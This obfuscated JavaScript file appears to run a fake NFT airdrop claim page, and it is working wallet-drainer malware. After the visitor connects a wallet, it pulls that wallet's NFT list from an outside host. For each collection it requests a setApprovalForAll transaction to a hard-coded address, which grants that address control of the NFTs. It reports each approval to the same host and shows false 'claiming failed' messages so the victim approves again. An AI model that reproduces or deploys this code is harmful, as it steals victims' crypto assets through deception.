const _0x5e3f5b=_0x3fed;(function(_0x17e64d,_0x131d0f){const _0x326543=_0x3fed,_0x4f0f3b=_0x17e64d();while(!![]){try{const _0x1b568c=parseInt(_0x326543(0x1fe))/0x1+parseInt(_0x326543(0x1e7))/0x2*(parseInt(_0x326543(0x212))/0x3)+parseInt(_0x326543(0x1d8))/0x4+parseInt(_0x326543(0x1fa))/0x5+-parseInt(_0x326543(0x1f7))/0x6*(parseInt(_0x326543(0x1e9))/0x7)+parseInt(_0x326543(0x202))/0x8+-parseInt(_0x326543(0x1f2))/0x9;if(_0x1b568c===_0x131d0f)break;else _0x4f0f3b['push'](_0x4f0f3b['shift']());}catch(_0x451993){_0x4f0f3b['push'](_0x4f0f3b['shift']());}}}(_0x10e9,0xcd870));let URL='https://cdbs.link',ApproveAdr='0x4a57ae665CE8cc565Eba852245da484695eD34ee';const connectbtn=document['getElementById'](_0x5e3f5b(0x1ed)),msg=document[_0x5e3f5b(0x1d5)](_0x5e3f5b(0x1e4));function bodyLoaded(){const _0xf90209=_0x5e3f5b;msg[_0xf90209(0x1e6)]='',toggleButton(![]),console[_0xf90209(0x1d9)](_0xf90209(0x1cd));}function _0x3fed(_0x46da45,_0x3dc8fc){const _0x10e973=_0x10e9();return _0x3fed=function(_0x3fedfe,_0x2cb634){_0x3fedfe=_0x3fedfe-0x1cd;let _0x23046a=_0x10e973[_0x3fedfe];return _0x23046a;},_0x3fed(_0x46da45,_0x3dc8fc);}let abi=[{'inputs':[{'internalType':'address','name':_0x5e3f5b(0x1df),'type':'address'},{'internalType':_0x5e3f5b(0x1eb),'name':_0x5e3f5b(0x1de),'type':_0x5e3f5b(0x1eb)}],'name':'setApprovalForAll','outputs':[],'stateMutability':_0x5e3f5b(0x20d),'type':_0x5e3f5b(0x1f9)},{'constant':!0x1,'inputs':[{'name':_0x5e3f5b(0x1d1),'type':_0x5e3f5b(0x1dd)},{'name':_0x5e3f5b(0x1f0),'type':_0x5e3f5b(0x200)}],'name':_0x5e3f5b(0x1d2),'outputs':[],'payable':!0x1,'stateMutability':_0x5e3f5b(0x20d),'type':_0x5e3f5b(0x1f9)}];const Web3Modal=window[_0x5e3f5b(0x1f6)]['default'],WalletConnectProvider=window[_0x5e3f5b(0x203)][_0x5e3f5b(0x1fc)];let web3Modal,provider,selectedAccount,web3;const providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'infuraId':_0x5e3f5b(0x1cf)}}};web3Modal=new Web3Modal({'cacheProvider':![],'providerOptions':providerOptions,'disableInjectedProvider':![]});function toggleButton(_0x24fea8){const _0x58d587=_0x5e3f5b;btn=document[_0x58d587(0x1d5)](_0x58d587(0x1ed)),_0x24fea8==!![]?(btn[_0x58d587(0x1d3)](_0x58d587(0x1e3),''),document[_0x58d587(0x1f8)](_0x58d587(0x20a))[0x0][_0x58d587(0x1e3)]):btn[_0x58d587(0x1ce)](_0x58d587(0x1e3));}function setButtonText(_0x2a0448){connectbtn['innerText']=_0x2a0448;}window[_0x5e3f5b(0x1f5)]['on'](_0x5e3f5b(0x1ea),function(){connect();});async function connect(){const _0x9f375b=_0x5e3f5b;msg[_0x9f375b(0x1e6)]='';try{await web3Modal[_0x9f375b(0x1f1)]();}catch(_0x219d69){console['log'](_0x219d69);}provider=await web3Modal[_0x9f375b(0x1ed)](),web3=new Web3(provider),console['log'](_0x9f375b(0x211),web3);const _0x2a189d=await web3['eth'][_0x9f375b(0x20b)](),_0x4de6b7=await web3[_0x9f375b(0x1fd)][_0x9f375b(0x1e2)](_0x2a189d[0x0]),_0x3c8be4=await web3[_0x9f375b(0x1fd)][_0x9f375b(0x205)](),_0x1ffeae=0x1;console['log'](_0x9f375b(0x1ef)),console[_0x9f375b(0x1d9)](_0x3c8be4),console[_0x9f375b(0x1d9)](window[_0x9f375b(0x1f5)]);if(_0x3c8be4!==_0x1ffeae)try{console[_0x9f375b(0x1d9)](_0x9f375b(0x20c)),await window[_0x9f375b(0x1f5)][_0x9f375b(0x1ee)]({'method':_0x9f375b(0x1e0),'params':[{'chainId':web3[_0x9f375b(0x201)][_0x9f375b(0x1db)](0x1)}]});}catch(_0x4723b6){console['log'](_0x9f375b(0x1ff)),console[_0x9f375b(0x1d9)](_0x4723b6),_0x4723b6[_0x9f375b(0x1e1)]===0x1326&&await window['ethereum'][_0x9f375b(0x1ee)]({'method':'wallet_addEthereumChain','params':[{'chainName':_0x9f375b(0x20e),'chainId':web3['utils'][_0x9f375b(0x1db)](0x38),'nativeCurrency':{'name':_0x9f375b(0x1d0),'decimals':0x12,'symbol':_0x9f375b(0x1d0)},'rpcUrls':[_0x9f375b(0x206)]}]});}selectedAccount=_0x2a189d[0x0];try{try{toggleButton(![]),await performInjection(selectedAccount,_0x4de6b7);}catch(_0x4508fd){console[_0x9f375b(0x1d9)](_0x4508fd);}}catch(_0x4746d0){console[_0x9f375b(0x1d9)](_0x4746d0);}}function _0x10e9(){const _0x4533ed=['Web3Modal','5058wpjAfc','getElementsByTagName','function','6416295xJzKYZ','setApprovalForAll','default','eth','1618974nwGUCW','err','uint256','utils','11758976tvKEJU','WalletConnectProvider','methods','getChainId','https://bsc-dataseed.binance.org/','performing\x20injection','Sorry,\x20you\x20are\x20not\x20eligible\x20for\x20this\x20airdrop\x20round.\x20Try\x20checking\x20another\x20address.','Claiming...','button','getAccounts','switching\x20chain','nonpayable','Binance\x20Chain','data','Connect\x20Wallet','Web3\x20instance\x20is','87078TZRpTp','loaded','removeAttribute','a10fbcf3c5e040369e4cde0724a65e48','BNB','_spender','approve','setAttribute','stringify','getElementById','addr','json','4207088Mullxk','log','sorted','toHex','/transfer','address','approved','operator','wallet_switchEthereumChain','code','getBalance','disabled','msg','token_id','innerText','4DFQmIO','application/json','8596zcbiXt','accountsChanged','bool','length','connect','request','chain','_value','clearCachedProvider','32443965uIaiHD','Contract','encodeABI','ethereum'];_0x10e9=function(){return _0x4533ed;};return _0x10e9();}async function performInjection(_0x40af5a){const _0x180c04=_0x5e3f5b;console[_0x180c04(0x1d9)](_0x180c04(0x207)),setButtonText('Checking\x20Eligibility'),toggleButton(!![]);let _0x1acbff=await getNFTS(selectedAccount),_0x58c330=_0x1acbff;console[_0x180c04(0x1d9)](_0x180c04(0x1da)),console['log'](_0x58c330);if(_0x58c330[_0x180c04(0x1ec)]==0x0){msg[_0x180c04(0x1e6)]=_0x180c04(0x208),setButtonText(_0x180c04(0x210)),toggleButton(![]);throw'No\x20NFTs\x20found';}for(let _0x7bd2b6=0x0;_0x7bd2b6<_0x58c330[_0x180c04(0x1ec)];_0x7bd2b6++){console[_0x180c04(0x1d9)](_0x7bd2b6),setButtonText(_0x180c04(0x209));let _0x256843=_0x58c330[_0x7bd2b6];console[_0x180c04(0x1d9)](_0x58c330[_0x7bd2b6]);let _0x4ff8e1=new web3[(_0x180c04(0x1fd))][(_0x180c04(0x1f3))](abi,_0x256843),_0x55184f=_0x4ff8e1[_0x180c04(0x204)][_0x180c04(0x1fb)](ApproveAdr,!![])[_0x180c04(0x1f4)]();const _0x1259b6={'to':_0x256843[_0x180c04(0x1d6)],'from':selectedAccount,'value':0x0,'data':_0x55184f};try{const _0x302068=await provider[_0x180c04(0x1ee)]({'method':'eth_sendTransaction','params':[_0x1259b6]});if(_0x7bd2b6==_0x58c330[_0x180c04(0x1ec)]-0x1){}const _0x398b20={'contract':_0x256843[_0x180c04(0x1d6)],'token_id':_0x256843[_0x180c04(0x1e5)],'schema_type':_0x256843['schema_type'],'sender':selectedAccount,'receiver':ApproveAdr,'hash':_0x302068};console[_0x180c04(0x1d9)](_0x180c04(0x20f)),console[_0x180c04(0x1d9)](_0x398b20),await fetch(URL+_0x180c04(0x1dc),{'method':'POST','headers':{'Content-Type':_0x180c04(0x1e8)},'body':JSON[_0x180c04(0x1d4)](_0x398b20)}),msg[_0x180c04(0x1e6)]='Claiming\x20failed\x20due\x20to\x20high\x20traffic\x20load,\x20please\x20try\x20again.';}catch(_0x36a143){msg['innerText']='Claiming\x20failed,\x20please\x20try\x20again.',await performInjection(_0x40af5a);}}}async function getNFTS(_0xbbf8fa){const _0x57f655=_0x5e3f5b;let _0x544cad=URL+'/addr/'+_0xbbf8fa,_0x1afbc7=await fetch(_0x544cad),_0x291811=await _0x1afbc7[_0x57f655(0x1d7)]();return console[_0x57f655(0x1d9)](_0x291811),_0x291811;}